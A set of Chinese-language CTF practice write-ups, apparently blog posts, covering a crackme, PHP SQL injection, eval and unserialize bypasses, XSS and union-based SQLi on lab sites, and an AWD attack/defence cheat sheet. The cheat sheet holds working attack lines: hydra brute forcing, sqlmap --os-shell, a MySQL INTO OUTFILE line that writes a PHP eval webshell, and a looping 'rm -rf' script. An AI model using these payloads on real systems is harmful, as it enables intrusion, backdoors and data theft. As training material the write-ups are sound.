<p>首先运行Brad Soblesky.1.exe，发现出现输入对话框，可知可能是<strong>C++ MFC</strong>；需要输入字符，所以可能<strong>采用GetDlgItemText函数</strong>（这个就需要正向编程经验的积累了）；通过输入和点击<code>Check</code>，发现弹出对话框，可以猜想，一定有<strong>条件语句</strong>比对输入是否正确。</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5g4ilyk9j308303ywem.jpg" alt="image-20191222134137326"></p>
<p>用IDA打开分析，1.未输入：弹出”Enter Registration Number”；</p>
<p>2.已输入：</p>
<ul>
<li><p>错误：弹出”Incorrect try again!!”；</p>
</li>
<li><p>正确：弹出”Correct way to go!!”。</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5g7rucxgj30ul09zmyb.jpg" alt="image-20191222134447861"></p>
</li>
</ul>
<p>我们只需要找密码，关注正确的分支代码。</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5g9f5usij30hy06xmy9.jpg" alt="image-20191222134620058"></p>
<p>然后就成功找到值，<BrD-SoB></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5gaaylhfj308u057jrw.jpg" alt="image-20191222134713978"></p>
]]></content>
      <categories>
        <category>ctf练习</category>
      </categories>
  </entry>
  <entry>
    <title>记录第一次课堂练习web题目</title>
    <url>/2020/05/15/%E7%BB%83%E4%B9%A01/</url>
    <content><![CDATA[<h3 id="题目一："><a href="#题目一：" class="headerlink" title="题目一："></a>题目一：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br></pre></td></tr></table></figure>

<p>传参username和password对数据库做查询</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str=stripslashes($str);</span><br></pre></td></tr></table></figure>

<p>输入字符会把‘ 或者“ 转换为html实体，无法闭合源码中的’。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$query&#x3D;&#39;SELECT * FROM users WHERE name&#x3D;\&#39;&#39;.$username.&#39;\&#39; AND pass&#x3D;\&#39;&#39;.$password.&#39;\&#39;;&#39;;</span><br></pre></td></tr></table></figure>

<p>使用转义符\，使‘失效闭合name=’的语句，使pass后面的值为真。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where name &#x3D;&#39;admin\&#39; and pass &#x3D;&#39;or 1&#x3D;1#&#39;</span><br></pre></td></tr></table></figure>



<p>[<a href="http://10.196.8.21:18001/challenge18.php?username=admin%20\&amp;password=or%201=1%23]" target="_blank" rel="noopener">http://10.196.8.21:18001/challenge18.php?username=admin%20\&amp;password=or%201=1%23]</a>(<a href="http://10.196.8.21:18001/challenge18.php?username=admin" target="_blank" rel="noopener">http://10.196.8.21:18001/challenge18.php?username=admin</a> &amp;password=or 1=1%23)</p>
<p>注入后就获得值</p>
<p>Connected to Database!Hello root<br>Your password is:2eb15de99ded49fb714981afb3dae1eb615a3162</p>
<h3 id="题目二："><a href="#题目二：" class="headerlink" title="题目二："></a>题目二：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$f = $_GET[<span class="string">'eval'</span>];        </span><br><span class="line">	$f = str_replace(<span class="keyword">array</span>(<span class="string">'`'</span>, <span class="string">'$'</span>, <span class="string">'*'</span>, <span class="string">'#'</span>, <span class="string">':'</span>, <span class="string">'\\'</span>, <span class="string">'"'</span>, <span class="string">"'"</span>, <span class="string">'('</span>, <span class="string">')'</span>, <span class="string">'.'</span>, <span class="string">'&gt;'</span>), <span class="string">''</span>, $f);</span><br><span class="line">        <span class="keyword">if</span>((strlen($f) &gt; <span class="number">13</span>) || (<span class="keyword">false</span> !== stripos($f, <span class="string">'return'</span>)))</span><br></pre></td></tr></table></figure>

<p>传入参数为eval，然后用str_replace过滤,并且要求长度小于13，不能包含return</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#return ($spaceone === '1337');</span></span><br><span class="line">	<span class="keyword">if</span>($spaceone === <span class="string">'1337'</span>)</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"FLAG&#123;xxx&#125;"</span>;</span><br></pre></td></tr></table></figure>

<p>然后执行eval，让spaceone===’1337’ 返回ture。</p>
<p>str_replace 过滤了单双引号，直接传eval=’1337’不行，过滤后会变成soaceone=1337 不等</p>
<p>可以用heredoc构造绕过单引号</p>
<ol>
<li>使用操作符“ &lt;&lt;&lt;”</li>
<li>操作符后紧跟标识符（开始标识符），之后重起新的一行输入要引用的字符串，可以包含变量。</li>
<li>新的一行，顶格写结束表示符，以分号结束。例如```php &lt;？php</li>
</ol>
<p>?eval=&lt;&lt;&lt;s%0a1337%0as;%0a</p>
<p>FLAG{5a38989fe3a5274341f74f6415b99b9bb8e4dde9}</p>
<h3 id="题目三："><a href="#题目三：" class="headerlink" title="题目三："></a>题目三：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $enter;</span><br><span class="line">    <span class="keyword">var</span> $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">    $pass = $_GET[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $pass=stripslashes($pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $o = unserialize($pass);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($o) &#123;</span><br><span class="line">        $o-&gt;secret = <span class="string">"FLAG&#123;xxx&#125;"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.$o-&gt;secret;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"are you trolling?"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>1，声明了一个类，这个类里面包含有<code>$enter</code>，<code>$secret</code>两个成员，先把传入的$pass参数反序列化，并传参给$o。如果<code>$o-&gt;secret === $o-&gt;enter</code>，那么久输出所谓的秘密，也就是o-&gt;secret。</p>
<p>2，首先获取我们传入的参数，进行反序列化；给$o中的secret赋值；比较$o-&gt;secret和$o-&gt;enter是否相等。注意这里是 ‘===’。</p>
<p>3，在 PHP 中普通的传值赋值行为有个例外就是碰到对象 object 时，在 PHP 5 中是以引用赋值的，除非明确使用了 clone 关键字来拷贝，PHP 支持引用赋值，使用“$var = &amp;$othervar;”语法。引用赋值意味着两个变量指向了同一个数据，没有拷贝任何东西。</p>
<p>4，知道上面所说的，我们就可以把上面的代码改一下了：`enter = &amp;$o-&gt;secret; //这里是重点。我们使用引用传参的特点，让$o-&gt;secret的值和$o-&gt;enter的值，这样两个变量就永远相等了 echo serialize($o); ?&gt;</p>
<p>5,序列化字符串为： O:8:”just4fun”:2:{s:5:”enter”;N;s:6:”secret”;R:2;}</p>
<p>?pass=O:8:”just4fun”:2:{s:5:”enter”;N;s:6:”secret”;R:2;}</p>
<p>Congratulation! Here is my secret: FLAG{8818d37a24b4921c2d26fb313cd27a6a2c65a37a}</p>
]]></content>
      <categories>
        <category>ctf练习</category>
      </categories>
  </entry>
  <entry>
    <title>ctf论剑场Crypto</title>
    <url>/2020/05/16/ctf%E8%AE%BA%E5%89%91%E5%9C%BA-crypto/</url>
    <content><![CDATA[<h3 id="一、进制转换"><a href="#一、进制转换" class="headerlink" title="一、进制转换"></a>一、进制转换</h3><p>​    1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331</p>
<ol>
<li><p>像是4进制，用脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list = <span class="string">"1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331"</span></span><br><span class="line">cha = list.split(<span class="string">" "</span>)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cha:</span><br><span class="line">    flag += chr(int(i,<span class="number">4</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>



</li>
</ol>
<ol start="2">
<li></li>
</ol>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>AWD攻防</title>
    <url>/2020/05/16/%E6%94%BB%E9%98%B2%E6%96%87%E4%B9%A6/</url>
    <content><![CDATA[<h2 id="linux加固思路"><a href="#linux加固思路" class="headerlink" title="linux加固思路"></a>linux加固思路</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><ul>
<li><p>awk -F: ‘/bash$/{print $1}’ /etc/passwd    看不是nologin的用户</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5scnq89tj30fd02x3yo.jpg" alt="image-20191222204439238"></p>
<ul>
<li><p>删除用户，改密码</p>
<ul>
<li><p>echo 用户名:密码 | chpasswd</p>
</li>
<li><p>锁定用户  passwd -l 用户名  (-u 解锁)</p>
</li>
<li><p>/etc/hosts.allow   添加sshd:ip    限制登陆ip</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5si6op3oj30ga0dmwgh.jpg" alt="image-20191222205000466"></p>
</li>
<li><p>/etc/hosts.deny    添加sshd:ALL    拒绝所有ip连接，先设置deny，在设置allow</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5siw0qdhj30ff08omy8.jpg" alt="image-20191222205040511"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>ps -ef | grep 服务名    查看系统进程</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5sjxy7t8j30fp09w3zo.jpg" alt="image-20191222205141209"></p>
<ul>
<li><p>netstat -tunlp      查看系统进程</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5sksoxu3j30ix06owfw.jpg" alt="image-20191222205231220"></p>
<ul>
<li>kill -9 pid         强制杀进程</li>
</ul>
</li>
</ul>
</li>
<li><p>注意查看./文件，</p>
</li>
</ul>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5slqy5h6j30fy024dg3.jpg" alt="image-20191222205325439"></p>
<ul>
<li>开机自启动服务   /etc/rc.local</li>
</ul>
<h3 id="数据库加固"><a href="#数据库加固" class="headerlink" title="数据库加固"></a>数据库加固</h3><ul>
<li>mysql -u root -h127.0.0.1 -p    登陆数据库<ul>
<li>select * from users;    查看所有用户<ul>
<li>看表中host值为%，删除    delete from user where user=’root’ and host=’%’;</li>
<li>set password for ‘用户‘@’地址’=password(‘新密码’);</li>
<li>flush privileges;     service mysql restart   保存、重启数据库</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="web加固"><a href="#web加固" class="headerlink" title="web加固"></a>web加固</h3><ul>
<li><p>备份网站文件</p>
</li>
<li><p>find ./ -name ‘*.php’ | xargs grep -n ‘eval’    查找文件中关键函数</p>
</li>
<li><p>import os</p>
<p>import time</p>
<p>while 1:</p>
<p>​    os.system(‘rm -rf /tmp/*’)</p>
<p>​    time.sleep(1)</p>
<p>删除文件上传目录下的文件，不允许文件存在</p>
</li>
<li><p>修改函数加固，限制上传文件</p>
</li>
<li><p>网站目录权限    chmod -R 000 /var/www/html</p>
</li>
</ul>
<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><ul>
<li><p>/etc/vsftpd.conf</p>
<ul>
<li><p>chroot_local_user=YES      将用户限制在主目录</p>
</li>
<li><p>local_root=/media/ftp/pub   本地用户主目录</p>
</li>
<li><p>anonymous_enable=NO    匿名用户</p>
</li>
</ul>
</li>
</ul>
<h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><ul>
<li>/var/log/apache2/access.log        日志利用</li>
</ul>
<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ul>
<li><p>信息收集</p>
<ul>
<li>nmap -T4 -sS -O -sV -A –script=vuln 172.16.1.0/24</li>
<li>curl <a href="http://10.10.10.1/post/post.php" target="_blank" rel="noopener">http://10.10.10.1/post/post.php</a> -d “flag=123456&amp;IP=X.X.X.X”    提交方式（参考）</li>
</ul>
</li>
<li><p>爆破</p>
<ul>
<li><p>hydra -L 用户名字典 -P 密码字典    mysql://IP地址 -v</p>
</li>
<li><p>弱密码登陆 root、server、admin、user。。。。。。。</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5u7z1luuj30lx04qjru.jpg" alt="image-20191222214922135"></p>
</li>
</ul>
</li>
<li><p>系统漏洞</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5u8jmozqj30jc095wfu.jpg" alt="image-20191222214955725"></p>
</li>
</ul>
<ul>
<li><p>ftp</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5uapqm5ej30fi0eu43n.jpg" alt="image-20191222215201358"></p>
</li>
</ul>
<ul>
<li><p>查找后门</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5ublzc7tj30un0fm40z.jpg" alt="image-20191222215253199"></p>
</li>
</ul>
<ul>
<li><p>绕过</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5uce0nmoj30i003w74g.jpg" alt="image-20191222215338142"></p>
</li>
</ul>
<ul>
<li><p>phpmyadmin</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5uctvn9xj30p409njst.jpg" alt="image-20191222215403086"></p>
</li>
</ul>
<h4 id="mysql数据库利用"><a href="#mysql数据库利用" class="headerlink" title="mysql数据库利用"></a>mysql数据库利用</h4><ul>
<li>sqlmap -d’mysql://账号:密码@IP地址:3306/mysql’ –os-shell                返回一个shell</li>
<li>select “<?php @eval($_POST['alin']);?>” into outfile “/var/www/html/alin.php”;</li>
</ul>
<h3 id="web利用"><a href="#web利用" class="headerlink" title="web利用"></a>web利用</h3><p>php://input       data:text/plain;          都可用这个语句读flag</p>
<?php
$lines=file('/root/flaginfo.txt');foreach($lines as $line_num => $line){
echo "Line #{$line_num} : ",$line,'<br />';}
?>





<p>/var/log/secure # 与安全相关的日志信息       系统日志</p>
<p>/var/log/apache/access.log            网站日志</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>记录第三次课堂练习</title>
    <url>/2020/05/16/%E7%BB%83%E4%B9%A03/</url>
    <content><![CDATA[<h4 id="第一题：ASCII解码"><a href="#第一题：ASCII解码" class="headerlink" title="第一题：ASCII解码"></a>第一题：ASCII解码</h4><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyozgsxylj30bj01tjrp.jpg" alt="img"> </p>
<h4 id="第二题：base64"><a href="#第二题：base64" class="headerlink" title="第二题：base64"></a>第二题：base64</h4><p>缺一半的64  不就是32</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyozc5ckjj30bj02i74n.jpg" alt="img"> </p>
<h4 id="第三题：Escape"><a href="#第三题：Escape" class="headerlink" title="第三题：Escape"></a>第三题：Escape</h4><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyozehdmrj30bj0300tv.jpg" alt="img"> </p>
<h4 id="第四题：16进制"><a href="#第四题：16进制" class="headerlink" title="第四题：16进制"></a>第四题：16进制</h4><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyozge50uj30bj01wmxn.jpg" alt="img"> </p>
<h4 id="第五题：JSFUCK"><a href="#第五题：JSFUCK" class="headerlink" title="第五题：JSFUCK"></a>第五题：JSFUCK</h4><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyozcpi3uj30bk02t0th.jpg" alt="img"> </p>
<h4 id="第六题：quoted-printable"><a href="#第六题：quoted-printable" class="headerlink" title="第六题：quoted-printable"></a>第六题：quoted-printable</h4><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyozha2ijj30bj01qwf1.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyozff8lsj30bj065diq.jpg" alt="img"> </p>
<h4 id="第七题：unicode"><a href="#第七题：unicode" class="headerlink" title="第七题：unicode"></a>第七题：unicode</h4><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyozfzob2j30bj035t9f.jpg" alt="img"> </p>
<h4 id="第八题：url"><a href="#第八题：url" class="headerlink" title="第八题：url"></a>第八题：url</h4><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyozbj81uj30bj02074k.jpg" alt="img"> </p>
<h4 id="第十题：莫斯"><a href="#第十题：莫斯" class="headerlink" title="第十题：莫斯"></a>第十题：莫斯</h4><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyozd1yboj30bk031wen.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyozdllu0j30bj044jrk.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyozexj7xj30bj01174g.jpg" alt="img"> </p>
]]></content>
      <categories>
        <category>ctf练习</category>
      </categories>
  </entry>
  <entry>
    <title>记录对Piti&#39;s wonderful blog漏洞挖掘</title>
    <url>/2020/05/16/%E7%BB%83%E4%B9%A04/</url>
    <content><![CDATA[<p>1.首页发现收索框，尝试xss，发现存在反射型xss漏洞</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3gkypzj30bj02o749.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3iisv3j309z05ldfq.jpg" alt="img"> </p>
<p>2.首页发现一个登陆框，发现万能用户登陆 admin’ or ‘1’=’1’</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3bkgfkj30b50623zd.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3c0oe0j307n030jrc.jpg" alt="img"> </p>
<p>3.用户登陆后看到写文章版，尝试存储型xss,过滤<script>标签，大小写绕过  </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3g3qphj30bj042t9c.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3d8ufmj30bj04u0su.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3ckqbgj30bk03nt8u.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3k94ozj30bk0473ym.jpg" alt="img"> </p>
<p>4.发现评论处，存在存储型xss</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3fn1zaj30bj03djri.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3csj6sj30bj05sq32.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3juf6xj309x059gli.jpg" alt="img"> </p>
<p>5.首页收索框发现存在sql注入，判断字段为3</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3jd8wej30bk047wem.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3drl3yj30bj05xt93.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3b2fd0j30bj05qwez.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3f9pulj30bj06jaap.jpg" alt="img"> </p>
<p>6.登陆后发现有一个action传参，存在本地文件包含</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3epxppj30bj03owep.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3e91oqj30bj04qq3p.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp3iw2e9j30bj02n74k.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>ctf练习</category>
      </categories>
  </entry>
  <entry>
    <title>记录对permate漏洞挖掘</title>
    <url>/2020/05/16/%E7%BB%83%E4%B9%A05/</url>
    <content><![CDATA[<p>1.反射型xss</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp5md3ftj30bk0550sv.jpg" alt="img"> </p>
<p>搜索框尝试xss语句，发现存在反射型xss</p>
<p>2.SQL注入</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp5jxeqbj30bk03sjrq.jpg" alt="img"> </p>
<p>存在sql注入</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp9t7745j30bj02uglt.jpg" alt="img"> </p>
<p>–+注释，发现存在11个字段</p>
<p><a href="http://10.196.8.31/home/index.php?m=tiezi&amp;a=index&amp;bk=5%20union%20select%201,2,3,4,5,6,7,8,9,10,11--+" target="_blank" rel="noopener">http://10.196.8.31/home/index.php?m=tiezi&amp;a=index&amp;bk=5%20union%20select%201,2,3,4,5,6,7,8,9,10,11--+</a></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp5kwgntj30bk00qglf.jpg" alt="img"> </p>
<p>发现3字段跟11字段有回显</p>
<p>[<a href="http://10.196.8.31/home/index.php?m=tiezi&amp;a=index&amp;bk=5%20union%20select%201,2,3,4,5,6,7,8,9,10,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27permeate%27%20--+]" target="_blank" rel="noopener">http://10.196.8.31/home/index.php?m=tiezi&amp;a=index&amp;bk=5%20union%20select%201,2,3,4,5,6,7,8,9,10,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27permeate%27%20--+]</a>(<a href="http://10.196.8.31/home/index.php?m=tiezi&amp;a=index&amp;bk=5" target="_blank" rel="noopener">http://10.196.8.31/home/index.php?m=tiezi&amp;a=index&amp;bk=5</a> union select 1,2,3,4,5,6,7,8,9,10,group_concat(table_name) from information_schema.tables where table_schema=’permeate’ –+)</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp5muhadj30bj00zwed.jpg" alt="img"> </p>
<p>查表</p>
<p>[<a href="http://10.196.8.31/home/index.php?m=tiezi&amp;a=index&amp;bk=5%20union%20select%201,2,3,4,5,6,7,8,9,10,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27bbs_user%27%20--+]" target="_blank" rel="noopener">http://10.196.8.31/home/index.php?m=tiezi&amp;a=index&amp;bk=5%20union%20select%201,2,3,4,5,6,7,8,9,10,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27bbs_user%27%20--+]</a>(<a href="http://10.196.8.31/home/index.php?m=tiezi&amp;a=index&amp;bk=5" target="_blank" rel="noopener">http://10.196.8.31/home/index.php?m=tiezi&amp;a=index&amp;bk=5</a> union select 1,2,3,4,5,6,7,8,9,10,group_concat(column_name) from information_schema.columns where table_name=’bbs_user’ –+)</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp5ke5agj30bj00ft8j.jpg" alt="img"> </p>
<p>查字段</p>
<p>[<a href="http://10.196.8.31/home/index.php?m=tiezi&amp;a=index&amp;bk=5%20union%20select%201,2,3,4,5,6,7,8,9,10,group_concat(username,password)%20from%20permeate.bbs_user%20--+]" target="_blank" rel="noopener">http://10.196.8.31/home/index.php?m=tiezi&amp;a=index&amp;bk=5%20union%20select%201,2,3,4,5,6,7,8,9,10,group_concat(username,password)%20from%20permeate.bbs_user%20--+]</a>(<a href="http://10.196.8.31/home/index.php?m=tiezi&amp;a=index&amp;bk=5" target="_blank" rel="noopener">http://10.196.8.31/home/index.php?m=tiezi&amp;a=index&amp;bk=5</a> union select 1,2,3,4,5,6,7,8,9,10,group_concat(username,password) from permeate.bbs_user –+)</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp5n9dbsj30bj00o747.jpg" alt="img"> </p>
<p>查内容</p>
<p>3.后台登陆存在sql注入</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geypa69bifj30bk03yq30.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp5o4ixsj30bj04jdg6.jpg" alt="img"> </p>
<p>4.普通登陆后上传点</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp5ldagvj30bj046wep.jpg" alt="img"> </p>
<p>可以上传成功，但是文件名被改</p>
<p>5.发帖出存在存储型xss</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp5jicktj30bj044dga.jpg" alt="img"> </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp5j7albj30bj05bdg9.jpg" alt="img"> </p>
<p>6.注册用户登陆后，点击后台管理发现直接是最高权限，越权</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geyp5nmkdaj309w06kglr.jpg" alt="img"> </p>
]]></content>
      <categories>
        <category>ctf练习</category>
      </categories>
  </entry>
  <entry>
    <title>ctf论剑场-web</title>
    <url>/2020/05/26/newbugku-web/</url>
    <content><![CDATA[<h4 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h4><p><a href="http://123.206.31.85:10026/" target="_blank" rel="noopener">http://123.206.31.85:10026/</a></p>
<p>代码审计发现，传入参赛num为数字并且str为字符串就会输出flag （if语句过滤了str的十进制和空字符，is_numeric 检测输入是否为数字）</p>
<p><a href="http://123.206.31.85:10026/?num=1&amp;&amp;str=a" target="_blank" rel="noopener">http://123.206.31.85:10026/?num=1&amp;&amp;str=a</a></p>
<h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><p><a href="http://123.206.31.85:10026/" target="_blank" rel="noopener">http://123.206.31.85:10026/</a></p>
<p>关于payload的说发有很多说法的有的说这个extract()函数能对已有变量进行值覆盖，但是我自己的解释还是觉得突破点在file_get_contents()函数，这个函数本是用来读取文件的，但是现在读取的是一个字符串，所以这个函数返回到$c的值就为空，所以此时应该传入a参数的值为空来拿到flag</p>
<p><a href="http://123.206.31.85:10001/?a=&amp;c=aaa" target="_blank" rel="noopener">http://123.206.31.85:10001/?a=&amp;c=aaa</a></p>
<h5 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h5><p><a href="https://new.bugku.com/upload/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.rar" target="_blank" rel="noopener">https://new.bugku.com/upload/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.rar</a></p>
<p>打开流量包，发现大量的telnet然后就过滤telnet，然后找一个包追踪tcp流发现密码为flag        </p>
<h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p><a href="http://123.206.31.85:10002/" target="_blank" rel="noopener">http://123.206.31.85:10002/</a></p>
<p>要求在3秒内计算出结果，所以我们要用到python</p>
<h4 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h4><p><a href="http://6fe97759aa27a0c9.bugku.com/" target="_blank" rel="noopener">http://6fe97759aa27a0c9.bugku.com/</a></p>
<p>打开发现页面有一个flag点击（flag不在这）,看到url有传参，尝试sql注入</p>
<p>order by 发现有4个字段，</p>
<p>[<a href="http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=0%20union%20select%201,2,group_concat(table_name),4%20from%20information_schema.tables%20where%20table_schema=%27web5%27]" target="_blank" rel="noopener">http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=0%20union%20select%201,2,group_concat(table_name),4%20from%20information_schema.tables%20where%20table_schema=%27web5%27]</a>(<a href="http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=0" target="_blank" rel="noopener">http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=0</a> union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=’web5’)</p>
<p>有3个表    flag,posts,users</p>
<p>[<a href="http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=0%20union%20select%201,2,group_concat(column_name),4%20from%20information_schema.columns%20where%20table_name=%27flag%27]" target="_blank" rel="noopener">http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=0%20union%20select%201,2,group_concat(column_name),4%20from%20information_schema.columns%20where%20table_name=%27flag%27]</a>(<a href="http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=0" target="_blank" rel="noopener">http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=0</a> union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=’flag’)</p>
<p>flag字段</p>
<p>[<a href="http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=-1%20union%20select%201,2,concat(flag),6%20from%20flag%20--]" target="_blank" rel="noopener">http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=-1%20union%20select%201,2,concat(flag),6%20from%20flag%20--]</a>(<a href="http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=-1" target="_blank" rel="noopener">http://6fe97759aa27a0c9.bugku.com/?mod=read&amp;id=-1</a> union select 1,2,concat(flag),6 from flag –)</p>
<p>得flag</p>
